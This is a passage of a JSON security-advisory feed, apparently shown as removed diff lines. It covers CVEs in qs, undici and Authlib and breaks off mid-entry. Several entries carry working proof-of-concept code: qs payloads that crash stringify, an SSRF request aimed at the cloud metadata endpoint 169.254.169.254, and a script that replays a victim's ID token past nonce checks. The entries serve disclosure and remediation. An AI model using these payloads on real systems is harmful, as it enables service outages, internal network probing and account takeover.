-      "summary": "## Summary\n\n`qs.stringify(obj, { arrayFormat: 'comma' })` throws an uncaught `TypeError: Cannot convert object to primitive value` when an array in `obj` contains an element that carries an own, non-callable `toString` property (for example `{ a: [ { toString: 'x' } ] }`). A remote, unauthenticated attacker who can influence an object that the application later re-serializes with the comma array format triggers the throw. In a service that lacks a synchronous error boundary around the serialization call, the uncaught exception crashes the worker process, producing a denial of service.\n\n## Root Cause\n\nWhen `arrayFormat: 'comma'` is selected, the comma branch collapses the whole array into a single value via `Array.prototype.join`, or, under `encodeValuesOnly: true`, maps each element through the value encoder before joining. Both paths perform an implicit string coercion (`ToPrimitive` with hint `\"string\"`) on each element. For an object whose own `toString` is a non-callable value, coercion skips the shadowed non-callable `toString`, falls through to `Object.prototype.valueOf` (which returns the object rather than a primitive), and throws. The comma branch runs this coercion before the per-element null and skip handling in the main loop, so nothing downstream can neutralize the hostile element, and the throw is never caught inside the library.\n\n```text\nlib/stringify.js  (comma-array branch)\n  line 152-154: obj = utils.maybeMap(obj, function (v) { return v == null ? v : encoder(v); });  // encodeValuesOnly path\n  line 156:     objKeys = [{ value: obj.length > 0 ? obj.join(',') || null : void undefined }];   // default comma path\nlib/utils.js\n  line 292:     string = String(str);   // value encoder coercion reached via the encodeValuesOnly path\n```\n\n## Impact\n\nPrerequisites: the application calls `qs.stringify` with `arrayFormat: 'comma'` (a documented, supported option) on an object whose shape can be influenced by attacker input. Attacker-controllable sources include `qs.parse(input, { allowPrototypes: true })`, which retains a `toString` segment (Express 4's default query parser, Express 5's `extended` query parser, and body-parser's `extended` urlencoded parser all set it), `qs.parse(input, { plainObjects: true })`, whose null-prototype elements throw even without a `toString` key (eg, `a[][b]=c`), and `JSON.parse` of a request body, which needs no qs parse option at all. No authentication or user interaction is required. Demonstrated capability: a single request forces an uncaught synchronous `TypeError` in the serialization call. In a naive single-process Node service with no synchronous error boundary, this crashes the process and takes the service offline (availability impact). Under a framework such as Express that traps synchronous handler throws, the plausible outcome is a per-request 500 rather than a full outage; that lower-impact case is noted but not the worst credible supported deployment. There is no confidentiality or integrity impact, no memory unsafety, and no prototype pollution.\n\n## Proof of Concept\n\n`Install qs at the affected version (for example 6.16.0) and run the following script with Node.js. No network setup is required; it demonstrates the throw in isolation.`\n\n```js\nvar qs = require('qs');\n\n// Source A: qs.parse with allowPrototypes retains the hostile toString segment\nqs.stringify(qs.parse('a[0][toString]=x', { allowPrototypes: true }), { arrayFormat: 'comma' });\n\n// Source B: a JSON request body, no qs parse option needed\nqs.stringify(JSON.parse('{\"a\":[{\"toString\":\"x\"}]}'), { arrayFormat: 'comma' });\n\n// Also affected: the encodeValuesOnly sub-path\nqs.stringify(JSON.parse('{\"a\":[{\"toString\":\"x\"}]}'), { arrayFormat: 'comma', encodeValuesOnly: true });\n```\n\n```text\nA default-join (allowPrototypes) => THREW: TypeError: Cannot convert object to primitive value\nB default-join (JSON.parse) => THREW: TypeError: Cannot convert object to primitive value\nC encodeValuesOnly path => THREW: TypeError: Cannot convert object to primitive value\nN2 callable toString => NO THROW; output=\"a=z\"\nN3 isBuffer vector (CVE-2026-82417) => NO THROW; output=\"a%5Bconstructor%5D%5BisBuffer%5D=x\"\nqs version: 6.16.0\n```\n\n## Attack Chain\n\n1. **Exposure:** A remote, unauthenticated request reaches an endpoint whose handler eventually serializes attacker-influenced data with `qs.stringify(obj, { arrayFormat: 'comma' })`.\n2. **Control:** The attacker supplies data that becomes `{ a: [ { toString: <non-callable value> } ] }`, either via `a[0][toString]=x` parsed with `allowPrototypes`, or via a JSON body `{\"a\":[{\"toString\":\"x\"}]}`.\n3. **Path:** In `stringify`, the primitive/buffer guard at `lib/stringify.js:134` is false for an array, so control reaches the comma branch at `lib/stringify.js:149`.\n4. **Guard:** On the `encodeValuesOnly` path, the closure `v == null ? v : encoder(v)` at `lib/stringify.js:152-154` passes only `null`/`undefined` through; a non-null object still reaches the encoder. The default path skips that closure entirely and reaches `obj.join(',')` at `lib/stringify.js:156` with no guard at all.\n5. **Primitive:** The element is coerced to a string (`Array.prototype.join`, or `String(str)` at `lib/utils.js:292`). `ToPrimitive` skips the non-callable own `toString`, `valueOf` returns the object, and a `TypeError` is thrown.\n6. **Result:** The uncaught synchronous exception propagates out of the serialization call, failing the request and, in a service without a synchronous error boundary, crashing the process (denial of service).\n\n## Bypass Evidence\n\nThis is a different element type on the code path CVE-2026-8723 (GHSA-q8mj-m7cp-5q26) patched, plus the default comma path, which that fix never covered. CVE-2026-8723 addressed a `TypeError` crash on `null`/`undefined` entries in the comma plus `encodeValuesOnly` path. Its fix (commit 21f80b3) wraps the encoder in `function (v) { return v == null ? v : encoder(v); }`, so it only passes `null` and `undefined` through. A non-null element with a hostile own `toString` fails the `v == null` test, so the encoder still runs and still throws; the encodeValuesOnly case (case C above) throws on the exact fixed code. The default comma path (`encodeValuesOnly` unset, the library default) never entered that fix at all: `git log -S \"obj.join(','\" -- lib/stringify.js` shows no security fix has ever touched the `obj.join(',')` line, and cases A and B throw with `encodeValuesOnly` unset. The related isBuffer hardening for CVE-2026-82417 (commit e83d321) is a different sink at the `lib/stringify.js:134` guard, which is never entered for the array element; the negative control `{a:{constructor:{isBuffer:'x'}}}` serializes cleanly. Disproof attempts that failed: a `valueOf`-only object does not throw (it serializes to `[object Object]`), confirming the trigger is an element with no callable `toString` (an own non-callable `toString`, or a null-prototype object with no `toString` at all, as `qs.parse` produces under `plainObjects`); nested arrays (`{\"a\":[[{\"toString\":\"x\"}]]}`) throw the same way; a callable `toString` serializes cleanly; and the default (non-comma) array format serializes cleanly, confirming the comma format is required. All positive and negative cases were reproduced on the exact published 6.16.0 artifact.\n\n## Affected Versions\n\n- `Ecosystem: npm`\n- `Package: qs`\n- `Confirmed affected range: >= 6.7.0, <= 6.16.0`\n- `Latest release checked: 6.16.0 (npm latest; git tag v6.16.0)`\n- `Fix status: fixed in 6.16.1 (a952e75)`\n\nThe `arrayFormat: 'comma'` join sink was introduced in qs 6.7.0, so 6.7.0 is the lower boundary; releases before 6.7.0 lack the sink. No released version fixes this vector, and the latest published release (6.16.0) reproduces the throw, so the closed upper bound `<= 6.16.0` covers every affected release. The `encodeValuesOnly` sub-path was added later, but the default comma-join vector already affects 6.7.0, so 6.7.0 governs the lower boundary.\n\n## Suggested Fix\n\nThe comma array serialization must not allow an implicit string coercion of an array element to throw an uncaught exception. Coercion of each comma element should be performed defensively (for example by wrapping the join and per-element encode so that a coercion failure is caught and handled), and this protection must cover both the default `obj.join(',')` path and the `encodeValuesOnly` encoder path, not only the previously patched `null`/`undefined` case. As an interim mitigation without a code change, applications can avoid `arrayFormat: 'comma'` when serializing data derived from untrusted input, sanitize parsed objects (avoid `allowPrototypes`/`plainObjects` on untrusted input and strip unexpected own properties), or wrap `qs.stringify` calls in a synchronous error boundary so a coercion failure cannot crash the process.\n\nReported by zx (GitHub: @manus-pi).\n\n## Independent report by @Lucidsec\n\nThe following was reported separately, after this advisory, and is merged here as a duplicate.\n\n### Summary\n\nIn project [qs](https://github.com/ljharb/qs), in versions `>= 6.7.0, <= 6.16.0` (every version that supports `arrayFormat: 'comma'`), `qs.stringify` with `arrayFormat: 'comma'` can throw an uncaught `TypeError: Cannot convert object to primitive value` when an array element has a non-callable own `toString`. It is fixed in 6.16.1. Related: CWE-248 and CWE-704.\n\n### Technical Details\n\n`qs.stringify` with `arrayFormat: 'comma'` joins an array at `lib/stringify.js:156` via `obj.join(',')`. An element whose own `toString` is not callable makes `Array.prototype.join` throw. There is no type check and no catch on that path.\n\nA second path exists with `encodeValuesOnly`: at `lib/stringify.js:151-154`, `maybeMap` only skips `v == null`, then `lib/utils.js:292` does `String(str)` and throws the same `TypeError` (this second site exists since v6.11.1; before that, the same input throws at `join`).\n\nWho can trigger: someone who can shape an array element passed to `stringify`. The host must use non-default `arrayFormat: 'comma'`. Default `arrayFormat` `indices` does not fold arrays and is not affected. A parse-then-stringify path also needs `plainObjects: true` (null-prototype elements from `lib/parse.js:200`) or `allowPrototypes: true` (which Express 4's default query parser, Express 5's `extended` query parser, and body-parser's `extended` urlencoded parser all set). Default `qs.parse('a[0][toString]=x')` returns `{}` because the prototype guard drops `toString`. Direct JSON handed to `stringify` can supply `{\"a\":[{\"toString\":\"x\"}]}`.\n\nCause: the comma fold at `lib/stringify.js:149-156` collapses the array into a single value before the main loop at `lib/stringify.js:172-212`, so `skipNulls` and `strictNullHandling` only ever see the joined value, never individual elements. `isNonNullishPrimitive` / `isBuffer` at `lib/stringify.js:134` inspect the whole value, not each element. A normal object uses `Object.prototype.toString` and becomes `[object Object]`. An own non-callable `toString` is skipped, `valueOf` returns the object, and `join` throws. (The skipped TODO test at `test/stringify.js:684-689` uses a plain `{ b: 1 }` element, which does not throw; it covers the separate question of what comma format should output for object elements, not this crash.) Earlier comma crash fixes did not cover object elements.\n\n### Impact\n\nOne small input makes that serialization path throw a synchronous, catchable `TypeError`. Behind a framework error boundary (eg, a synchronous Express handler), the request fails with a 500 and the process survives. In a host with no error boundary (eg, a bare `http.createServer` handler), the uncaught exception exits the process (the client sees `ECONNRESET`). Availability only.\n\n### Proof of Concept\n\n<details>\n<summary>Show the proof of concept</summary>\n\nChecked on the latest commit that was checked: `07b1d4d82c8f9301c105ea4b94fa2302cfd6e8b4`. Still present. Demonstrated.\n\n- Payload `{\"a\":[{\"toString\":\"x\"}]}` throws at `lib/stringify.js:156`.\n- Baseline `{\"a\":[\"x\",\"y\"]}` returns 200 with body `a=x%2Cy`.\n- A plain object element stringifies to `a=%5Bobject%20Object%5D` and does not throw.\n- `encodeValuesOnly: true` throws via `utils.js:292`.\n- `plainObjects` parse plus comma throws.\n\n</details>\n\n### Suggested Fix\n\nBefore `join`, map elements with the existing primitive check; skip or replace non-primitives so `join` cannot throw. On the `encodeValuesOnly` path, do not send non-primitives into `String()`. Optionally guard `lib/utils.js:292`. Add new regression tests.",
-      "cvssScore": 5.3,
-      "severity": "Medium",
-      "published": "2026-10-27",
-      "modified": "2026-10-27",
-      "cwe": {
-        "cwe_id": "CWE-248",
-        "name": "Uncaught Exception"
-      },
-      "references": [
-        "https://github.com/ljharb/qs/security/advisories/GHSA-6pq8-jhm2-2vcw",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-110816",
-        "https://github.com/ljharb/qs/commit/a952e7519338ef0cfb25694a2988848f93333727",
-        "https://github.com/ljharb/qs/releases/tag/v6.16.1",
-        "https://github.com/advisories/GHSA-6pq8-jhm2-2vcw"
-      ],
-      "vulnerableProducts": [
-        "qs npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-109855",
-      "summary": "### Impact\n\nundici's experimental WebSocket client (enabled by default via `allowH2: true`) crashes the Node.js process when it connects to a malicious server over HTTP/2. If the server answers the WebSocket upgrade with a response that fails handshake validation, undici aborts the request, but the abort is a no-op because the request is already marked completed, so the underlying `ClientHttp2Stream` is left open with no error listener. When the server then destroys the connection, the orphaned stream emits an unhandled `error` and the process exits. A remote, unauthenticated server can therefore deny service to any client that opens a WebSocket to it over HTTP/2. undici 8.11.0 and 8.11.1 are affected; the regression was introduced in 8.11.0.\n\n### Patches\n\nUpgrade to `8.11.2`.\n\n### Workarounds\n\nSet `allowH2: false` to disable HTTP/2 for WebSocket connections, or avoid opening WebSocket connections to untrusted servers, until upgrading.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2026-10-27",
-      "modified": "2026-10-27",
-      "cwe": {
-        "cwe_id": "CWE-248",
-        "name": "Uncaught Exception"
-      },
-      "references": [
-        "https://github.com/nodejs/undici/security/advisories/GHSA-qq8j-7v2v-3rwp",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-109855",
-        "https://github.com/nodejs/undici/pull/5873",
-        "https://github.com/nodejs/undici/commit/dd28c5c55f4a25f7c441fd4365b1191f96c3b8bf",
-        "https://cna.openjsf.org/security-advisories.html"
-      ],
-      "vulnerableProducts": [
-        "undici npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-114616",
-      "summary": "Reporter: Cavan Loughran, Celvex Group Inc.\n\nSummary\n\nAuthlib's symmetric (oct) key handling accepts an empty key (empty bytes b'' / empty string '') as a valid HMAC signing and verification key. An empty HMAC key produces a deterministic digest that any party can reproduce, so an attacker who knows (or can cause) the application to verify a token with an empty key can forge arbitrary tokens that pass HS256/HS384/HS512 signature verification. This is the Authlib member of the cross-language empty-HMAC-key family already assigned CVE-2026-44351 (fast-jwt, npm) and CVE-2026-45363 (ruby-jwt, RubyGems).\n\nThis is DISTINCT from Authlib's existing recent JWT-verification advisories. It is not closed by CVE-2026-27962 / GHSA-wvwj-cvrp-7pv5 (JWS JWK header injection, the key=None case), nor by CVE-2026-28802 / GHSA-7wc2-qxgw-g8gg (alg:none blank-signature bypass), nor by GHSA-5357-c2jx-v7qh (algorithm confusion with asymmetric public keys). Those address header-driven key injection, the none algorithm, and asymmetric-vs-symmetric confusion respectively; none of them rejects a zero-length oct key.\n\nAffected versions\n\nAuthlib <= 1.7.2 (latest release 1.7.2, 2026-05-06). Confirmed present at the v1.7.2 release tag and on the current main HEAD. The affected code is in authlib/jose/rfc7518/oct_key.py and authlib/jose/rfc7518/jws_algs.py.\n\nRoot cause (exact code location, release tag v1.7.2)\n\n- authlib/jose/rfc7518/oct_key.py, class OctKey:\n  - validate_raw_key is a type-only check: `return isinstance(key, bytes)`. An empty bytes object passes.\n  - import_key rejects only keys whose material starts with known unsafe prefixes (`if raw_key.startswith(POSSIBLE_UNSAFE_KEYS): raise ValueError(...)`, i.e. PEM/SSH prefixes). Empty bytes do not match any unsafe prefix, so b'' is accepted.\n  - get_op_key loads the raw key without validating its length.\n  - No check anywhere rejects a zero-length key, so an empty key b'' passes every gate.\n- authlib/jose/rfc7518/jws_algs.py, class HMACAlgorithm:\n  - prepare_key: `return OctKey.import_key(raw_data)`.\n  - sign / verify call key.get_op_key(...) then `hmac.new(op_key, msg, self.hash_alg)` / `hmac.compare_digest(...)`. With an empty op key this becomes hmac.new(b'', ...): a deterministic, publicly reproducible digest. There is no empty-key or minimum-length check.\n\nWhy this is a real signature bypass\n\nAn empty HMAC key makes the signature a public, deterministic function of the header and payload, so anyone can compute a valid signature and forge tokens. The realistic trigger matches the sibling CVEs: the deploying application sources the verification key from a place that can be empty at runtime, for example os.environ.get('JWT_SECRET', ''), a database/config column whose default is '', or a key-resolver that returns '' on a miss. Authlib is widely used to BUILD token verifiers (OAuth 2.0 resource servers, OIDC relying parties), and Authlib's own recent advisory history shows the JWS/JWT verify path is the live attack surface, so a key-resolution path that can yield '' is a realistic exposure.\n\nReproduction (prose, no weaponized exploit)\n\n1. In an application that uses Authlib to verify JWS/JWT, arrange for the verification key to be an empty value (e.g. an unset environment variable defaulted to '').\n2. An attacker constructs a token with header {alg: HS256} and an arbitrary payload, and computes the HS256 signature using an empty key (a value any party can reproduce because the key is empty).\n3. Authlib's HMAC verification accepts the token as validly signed, because OctKey.import_key did not reject the empty key and hmac.compare_digest matches the attacker-computable digest. The forged token is treated as authentic.\n\nNo live system was probed; the above describes the class. The vulnerable code path and the absent guard are confirmed by direct reading of the public source at the v1.7.2 tag and on current main.\n\nProof the fix is known-good (no novelty risk)\n\nThe same maintainer's newer JOSE library, joserfc, ALREADY rejects empty oct key material outright. In src/joserfc/_rfc7518/oct_key.py, import_key raises a ValueError on empty oct material, with an explicit note that an empty oct key produces a deterministic HMAC digest that any party can reproduce, allowing trivial signature forgery in JWS HS256/HS384/HS512 verification. (joserfc additionally warns on keys below 112 bits.) The same guard is simply absent from the older, far more widely deployed Authlib rfc7518 package. The flagship Python JOSE libraries also guard: PyJWT raises InvalidKeyError('HMAC key must not be empty.') for zero-length keys, and jwcrypto enforces an RFC 7518 minimum key length.\n\nImpact\n\nToken forgery / authentication bypass in OAuth 2.0 resource servers and OIDC relying parties built on Authlib whenever the HMAC verification key can be empty at runtime. An attacker can mint tokens with arbitrary claims (for example elevated scopes or another user's subject) that pass signature verification.\n\nSuggested remediation\n\nReject empty oct key material in OctKey.import_key (and/or validate_raw_key), exactly as the maintainer's joserfc library already does, before the key can reach hmac.new in HMACAlgorithm.sign / verify. Consider also adopting joserfc's sub-112-bit minimum-length warning/rejection for HMAC keys.\n\nDisclosure\n\nReporter: Cavan Loughran, Celvex Group Inc.",
-      "cvssScore": 5.3,
-      "severity": "Medium",
-      "published": "2026-10-22",
-      "modified": "2026-10-30",
-      "cwe": {
-        "cwe_id": "CWE-287",
-        "name": "Improper Authentication"
-      },
-      "references": [
-        "https://github.com/authlib/authlib/releases/tag/v1.9.1",
-        "https://github.com/authlib/authlib/commit/4ff30db442c70e29486e1982cb0ad37c037f5f4b",
-        "https://github.com/authlib/authlib/security/advisories/GHSA-8m4g-j4wp-wgcg"
-      ],
-      "vulnerableProducts": [
-        "authlib PyPI"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-114620",
-      "summary": "### Summary\n\nAuthlib's RFC 9101 (JAR) extension passes the attacker-controlled `request_uri` authorization parameter straight to the `get_request_object()` fetch hook with no validation, at a pre-authentication endpoint. Authlib already defines the pre-registration allowlist for this (`request_uris` client metadata and `require_request_uri_registration` server metadata) but the extension never consults it, and both docstrings instruct integrators to implement the hook as an unrestricted `requests.get(request_uri)`. Deployments following the documented pattern get an unauthenticated SSRF primitive. \n### Details\n\nVerified against authlib 1.7.2 and current `main`. All line numbers below are from `authlib/oauth2/rfc9101/authorization_server.py`.\n\nThe extension registers itself on the `before_get_authorization_grant` hook (lines 62-65), so it runs on every authorization request before any user or client authentication. `support_request_uri` defaults to `True` (line 58).\n\nThe only gate before the sink is that `client_id` names an existing client (lines 91-103). A `client_id` is a public, non-secret identifier.\n\nThe sink at line 159 forwards the raw parameter with no scheme, host, or allowlist check:\n\n```python\ndef _get_raw_request_object(self, request: OAuth2Request) -> str:\n    if \"request_uri\" in request.payload.data:\n        raw_request_object = self.get_request_object(\n            request.payload.data[\"request_uri\"]\n        )\n        if not raw_request_object:\n            raise InvalidRequestUriError(state=request.payload.state)\n```\n\n`get_request_object` is abstract (line 213, `raise NotImplementedError()` at line 225), so authlib itself performs no outbound request. The defect is that authlib supplies unvalidated attacker input to that extension point and then documents the insecure implementation twice — in the class docstring (lines 34-38) and in the hook's own docstring (lines 218-223):\n\n```python\ndef get_request_object(self, request_uri: str):\n    try:\n        return requests.get(request_uri).text\n    except requests.Exception:\n        return None\n```\n\nTwo points sharpen this beyond a generic documentation issue:\n\n- **The allowlist already exists and is ignored.** Authlib validates `request_uris` as client metadata (`authlib/oauth2/rfc7591/claims.py:319`) and `require_request_uri_registration` as server metadata (`authlib/oauth2/rfc8414/models.py:263`). The `rfc9101` package contains zero references to either name, so the pre-registration model is never enforced at the point of use.\n- **RFC 9101 §10.4.1 asks for controls that are absent.** It states the server should \"a) check that the value of the `request_uri` parameter does not point to an unexpected location, b) check that the media type of the response is `application/oauth-authz-req+jwt`, c) implement a timeout for obtaining the content of `request_uri`, and d) not perform recursive GET on the `request_uri`.\" The extension implements none of these and the documented example implements none of them either.\n\nThe two failure paths are distinguishable, which supplies the inference channel for a blind SSRF: a falsy fetch result raises `InvalidRequestUriError` (`invalid_request_uri`, lines 162-163), while a successful fetch of non-JWT content raises `InvalidRequestObjectError` (`invalid_request_object`, line 186).\n\n### PoC\n\nThis demonstrates the library-level defect with no network egress required: it shows the unvalidated URI reaching the fetch hook pre-authentication.\n\n```bash\npython -m venv .venv && .venv/bin/pip install authlib\n```\n\n```python\nfrom authlib.oauth2.rfc6749.requests import BasicOAuth2Payload, OAuth2Request\nfrom authlib.oauth2.rfc9101 import JWTAuthenticationRequest\n\nreached = []\n\nclass Extension(JWTAuthenticationRequest):\n    def get_request_object(self, request_uri):\n        reached.append(request_uri)  # the docstring puts requests.get(request_uri) here\n        return None\n\n    def resolve_client_public_key(self, client):\n        return {\"keys\": []}\n\n    def get_server_metadata(self):\n        return {}\n\n    def get_client_require_signed_request_object(self, client):\n        return False\n\nclass AuthorizationServer:\n    def query_client(self, client_id):\n        return object()\n\nuri = \"http://169.254.169.254/latest/meta-data/\"\nrequest = OAuth2Request(\"GET\", \"https://as.example/authorize\")\nrequest.payload = BasicOAuth2Payload({\"client_id\": \"demo\", \"request_uri\": uri})\n\ntry:\n    Extension().parse_authorization_request(AuthorizationServer(), request)\nexcept Exception as exc:\n    print(\"error:\", type(exc).__name__)\n\nprint(\"fetch hook received:\", reached)\n```\n\nOutput on authlib 1.7.2:\n\n```text\nerror: InvalidRequestUriError\nfetch hook received: ['http://169.254.169.254/latest/meta-data/']\n```\n\nAgainst a deployment that used the docstring implementation, the equivalent unauthenticated request is:\n\n```text\nGET /authorize?response_type=code&client_id=demo&request_uri=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F\n```\n\nReturning a fetched-but-non-JWT body instead of `None` in the snippet above yields `InvalidRequestObjectError` rather than `InvalidRequestUriError`, showing the oracle that distinguishes a reachable target from an unreachable one.\n\n### Impact\n\nServer-side request forgery, reachable without authentication by anyone who knows a valid `client_id`. In a deployment that implemented `get_request_object` as documented, an attacker can make the authorization server issue GET requests to arbitrary URLs: internal-only services, cloud metadata endpoints such as `169.254.169.254`, and side-effectful internal GET routes. The `invalid_request_uri` versus `invalid_request_object` split, together with response timing, provides an oracle for internal host and port discovery. RFC 9101 §10.4.1 additionally notes the DoS and recursive-lookup risks that the missing timeout and recursion checks leave open.\n\nResponse bodies are consumed as a JWT and never reflected, so this is a blind primitive rather than direct data exfiltration. Because the fetch executes in integrator code, deployments that already allowlist inside their override are unaffected — but authlib provides no hook to make that the default, ships `support_request_uri=True`, and its documentation steers integrators to the unsafe implementation, so the insecure outcome is the expected one.",
-      "cvssScore": 6.7,
-      "severity": "Medium",
-      "published": "2026-10-22",
-      "modified": "2026-10-30",
-      "cwe": {
-        "cwe_id": "CWE-918",
-        "name": "Server-Side Request Forgery (SSRF)"
-      },
-      "references": [
-        "https://github.com/authlib/authlib/releases/tag/v1.9.0",
-        "https://github.com/authlib/authlib/commit/6563f6f7a8c2f71d2f85ee7511d72a4fbae3acc0",
-        "https://github.com/authlib/authlib/commit/891e3f10ae5989176211f8be35dcc7cd40aa92c6",
-        "https://github.com/authlib/authlib/pull/949",
-        "https://github.com/authlib/authlib/security/advisories/GHSA-x4rv-c3wx-4cr8"
-      ],
-      "vulnerableProducts": [
-        "authlib PyPI"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-114617",
-      "summary": "### Summary\n\n`OpenIDMixin.parse_id_token()` reads the `nonce_supported` claim from the ID token it is validating. When that claim is boolean `false`, the expected nonce is set to `None` and nonce validation is skipped for that token.\n\nAn ID token that carries this claim is therefore accepted in a session whose nonce does not match. A captured, validly signed ID token belonging to a victim can be replayed into an attacker-controlled session, authenticating the attacker as the victim at the relying party.\n\nThe code is identical in `authlib/integrations/base_client/sync_openid.py:82-83` and `authlib/integrations/base_client/async_openid.py:84-85`, so all framework integrations are affected. Fixed versions: none; reproduced on 1.8.0 (commit c529a61a).\n  \nPreconditions: the ID token must carry a valid signature and pass `iss` and `aud` validation, and the attacker must be able to supply it to `parse_id_token()`. Authorization code flow is not affected. Implicit and hybrid relying parties, and applications calling `parse_id_token()` directly, are affected.\n\n### Details\n\n## Affected code\n\n`authlib/integrations/base_client/sync_openid.py:80-85`, in `parse_id_token()`:\n\n```python\nclaims = claims_cls(token.claims, token.header, claims_options, claims_params)\n# https://github.com/authlib/authlib/issues/259\nif claims.get(\"nonce_supported\") is False:\n    claims.params[\"nonce\"] = None\n\nclaims.validate(leeway=leeway)\n```\n\n`authlib/integrations/base_client/async_openid.py:82-86` contains the same code.\n\n## Source of the claim\n\n`claims` is constructed from `token.claims`, which is the decoded payload of the ID token passed to `parse_id_token()`:\n\n```python\ntoken = jwt.decode(\n    token[\"id_token\"],\n    key=key_set,\n    registry=JWSRegistry(algorithms=alg_values, strict_check_header=False),\n)\n...\nclaims = claims_cls(token.claims, token.header, claims_options, claims_params)\n```\n\n`claims.get(\"nonce_supported\")` therefore resolves against the ID token payload. It is not read from `load_server_metadata()`, from client configuration, or from any other source under the relying party's control.\n\n## Effect on validation\n\n`IDToken.validate_nonce()` at `authlib/oidc/core/claims.py:69-83` performs the comparison only when the expected value is truthy:\n\n```python\nnonce_value = self.params.get(\"nonce\")\nif nonce_value:\n    if \"nonce\" not in self:\n        raise MissingClaimError(\"nonce\")\n    if nonce_value != self[\"nonce\"]:\n        raise InvalidClaimError(\"nonce\")\n```\n\nAssigning `claims.params[\"nonce\"] = None` makes `nonce_value` falsy, so both the presence check and the equality check are skipped. No error is raised and `claims.validate()` completes normally.\n\nThe docstring of that same method states the requirement:\n\n> If present in the ID Token, Clients MUST verify that the nonce Claim Value is equal to the value of the nonce parameter sent in the Authentication Request.\n\n## Trigger condition\n\nThe comparison is `is False`, so only a JSON boolean `false` activates the branch. A string value `\"false\"` does not, and nonce validation proceeds normally in that case.\n\n## Origin\n\nThe branch was added in commit `3ca7333c` (\"Skip verifying nonce for Apple case\") to accommodate a provider that emits a `nonce_supported` claim, as referenced by the inline comment pointing to issue #259.\n\n## Remediation\n\nRead the flag from server metadata or client configuration rather than from the token:\n\n```python\nmetadata = self.load_server_metadata()\nif metadata.get(\"nonce_supported\") is False:\n    claims.params[\"nonce\"] = None\n```\n\nThis preserves the behavior for relying parties configured against a provider that does not support nonces, while preventing the token from determining whether it is subject to nonce validation.\n\n### Proof of concept\n\n## Environment\n\n- authlib 1.8.0, commit `c529a61a` (tag `v1.8.0`)\n- Python 3.14\n- joserfc 1.7.5\n- No network access required\n\n```\ngit clone https://github.com/authlib/authlib.git && cd authlib\ngit checkout c529a61a\npython3 -m venv .venv\n.venv/bin/pip install -e . joserfc==1.7.5\n.venv/bin/python poc.py\n```\n\n## Configuration\n\nThe relying party is a subclass of the shipped `OpenIDMixin` supplying only `client_id` and `load_server_metadata()`. `fetch_jwk_set()` returns `metadata[\"jwks\"]` directly when the key set is present in metadata, so no HTTP request is made and no part of the validation path is stubbed.\n\nThe signing key is a generated RSA key. All three tokens are signed with it, carry `iss` and `aud` matching the relying party configuration, and are within their validity window. The relying party's session nonce is `nonce-the-rp-actually-generated`; every token carries the different nonce `nonce-from-the-captured-token`.\n\n## poc.py\n\n```python\nfrom joserfc import jwt\nfrom joserfc.jwk import RSAKey\nfrom authlib.integrations.base_client.sync_openid import OpenIDMixin\n\nISSUER = \"https://as.example\"\nCLIENT_ID = \"rp-client\"\nKEY = RSAKey.generate_key(2048, parameters={\"kid\": \"k1\"})\nJWKS = {\"keys\": [KEY.as_dict(private=False)]}\n\nclass RP(OpenIDMixin):\n    client_id = CLIENT_ID\n\n    def load_server_metadata(self):\n        return {\"issuer\": ISSUER, \"jwks\": JWKS}\n\ndef id_token(nonce, sub=\"victim\", nonce_supported=None):\n    claims = {\"iss\": ISSUER, \"sub\": sub, \"aud\": CLIENT_ID,\n              \"iat\": 1000000000, \"exp\": 4000000000, \"auth_time\": 1000000000}\n    if nonce is not None:\n        claims[\"nonce\"] = nonce\n    if nonce_supported is not None:\n        claims[\"nonce_supported\"] = nonce_supported\n    return jwt.encode({\"alg\": \"RS256\", \"kid\": \"k1\"}, claims, KEY)\n\nrp = RP()\nSESSION_NONCE = \"nonce-the-rp-actually-generated\"\nCAPTURED_NONCE = \"nonce-from-the-captured-token\"\n\ncases = [\n    (\"[1] no nonce_supported claim\", None),\n    (\"[2] nonce_supported: false\", False),\n    (\"[3] nonce_supported: \\\"false\\\"\", \"false\"),\n]\n\nfor label, flag in cases:\n    tok = {\"access_token\": \"AT\",\n           \"id_token\": id_token(CAPTURED_NONCE, nonce_supported=flag)}\n    try:\n        user = rp.parse_id_token(tok, nonce=SESSION_NONCE)\n        print(f\"{label:34s} -> ACCEPTED sub={user['sub']}\")\n    except Exception as e:\n        print(f\"{label:34s} -> REJECTED {type(e).__name__}: {e}\")\n```\n\n## Expected result\n\nAll three cases carry a nonce that does not match the relying party's session nonce, so all three should be rejected.\n\n## Observed result\n\n```\n[1] no nonce_supported claim       -> REJECTED InvalidClaimError: invalid_claim: Invalid claim: 'nonce'\n[2] nonce_supported: false         -> ACCEPTED sub=victim\n[3] nonce_supported: \"false\"       -> REJECTED InvalidClaimError: invalid_claim: Invalid claim: 'nonce'\n```\n\nCase [1] shows nonce validation rejecting a mismatched nonce under normal conditions. Case [2] differs from case [1] only by the addition of the `nonce_supported` claim and is accepted, returning the subject of the replayed token. Case [3] confirms the branch requires a JSON boolean.\n\nThe script exits 0 and produces identical output across three runs.\n\n### Impact\n\n## Type of vulnerability\n\nReliance on an untrusted input in a security decision (CWE-807), resulting in authentication bypass by capture-replay (CWE-294).\n\nThe nonce binds an ID token to the browser session that requested it and is the control that prevents a token issued for one session being presented in another. Because the flag that governs this check is read from the token itself, the check can be disabled by the data it is applied to.\n\n## Who is impacted\n\nOpenID Connect relying parties built on authlib's client integrations where an attacker can supply an ID token to `parse_id_token()`:\n\n- Implicit flow relying parties, where the ID token is returned in the URL fragment.\n- Hybrid flow relying parties, where the ID token is returned in the fragment or by form post.\n- Applications calling `parse_id_token()` directly on externally supplied input.\n\nBoth the synchronous and asynchronous integrations are affected, so Flask, Django and Starlette deployments are equally exposed.\n\nRelying parties using plain authorization code flow are not impacted, as the ID token is retrieved from the token endpoint over TLS following a `state` lookup and cannot be substituted by an attacker.\n\n## Consequence\n\nAn attacker in possession of a victim's ID token replays it into their own session. Nonce validation is skipped, `parse_id_token()` returns a `UserInfo` for the victim's subject, and the relying party establishes an authenticated session as the victim. This grants access to the victim's account at that relying party, including any data and actions available through it.\n\nThe token must carry a valid signature and pass `iss` and `aud` validation, so the vulnerability does not permit forging tokens or authenticating as an 